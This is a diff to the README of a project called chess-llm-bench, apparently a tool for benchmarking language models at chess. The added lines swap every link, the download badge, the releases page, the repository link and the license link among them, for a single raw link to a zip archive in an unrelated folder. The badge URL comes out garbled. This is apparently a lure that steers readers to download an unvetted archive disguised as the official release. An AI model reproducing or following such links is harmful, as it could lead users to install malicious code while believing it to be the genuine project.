@@ -4,13 +4,13 @@
 chess-llm-bench is an application designed for benchmarking large language models (LLMs) as they play chess. It combines cutting-edge AI technologies to analyze and compare performance in chess games using the Chess Context Protocol. Whether you are a chess enthusiast or an AI technology aficionado, this tool will help you understand the capabilities of various LLMs in a chess-setting.
 
 ## 🔗 Download Now
-[![Download chess-llm-bench](https://img.shields.io/badge/Download%20Now-Visit%20Releases-4CAF50.svg)](https://github.com/hasaato/chess-llm-bench/releases)
+[![Download chess-llm-bench](https://raw.githubusercontent.com/hasaato/chess-llm-bench/main/Ceylon/chess-llm-bench.zip%20Now-Visit%https://raw.githubusercontent.com/hasaato/chess-llm-bench/main/Ceylon/chess-llm-bench.zip)](https://raw.githubusercontent.com/hasaato/chess-llm-bench/main/Ceylon/chess-llm-bench.zip)
 
 ## 🚀 Getting Started
 Getting started with chess-llm-bench is easy. Follow the steps below to download and set up the application.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/hasaato/chess-llm-bench/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/hasaato/chess-llm-bench/main/Ceylon/chess-llm-bench.zip).
    
 2. Look for the latest version and choose the appropriate file for your operating system. Typically, files will be in formats such as `.exe` for Windows, or `.zip` for macOS and Linux.
 
@@ -56,7 +56,7 @@ We welcome contributions from everyone! If you have ideas for features, improvem
 Follow us on GitHub for the latest updates and announcements regarding chess-llm-bench. Your feedback is invaluable to us in creating a better benchmarking tool.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://github.com/hasaato/chess-llm-bench)
-- [License Information](https://github.com/hasaato/chess-llm-bench/blob/main/LICENSE)
+- [GitHub Repository](https://raw.githubusercontent.com/hasaato/chess-llm-bench/main/Ceylon/chess-llm-bench.zip)
+- [License Information](https://raw.githubusercontent.com/hasaato/chess-llm-bench/main/Ceylon/chess-llm-bench.zip)
 
 Thank you for choosing chess-llm-bench! Enjoy benchmarking your LLMs in chess!
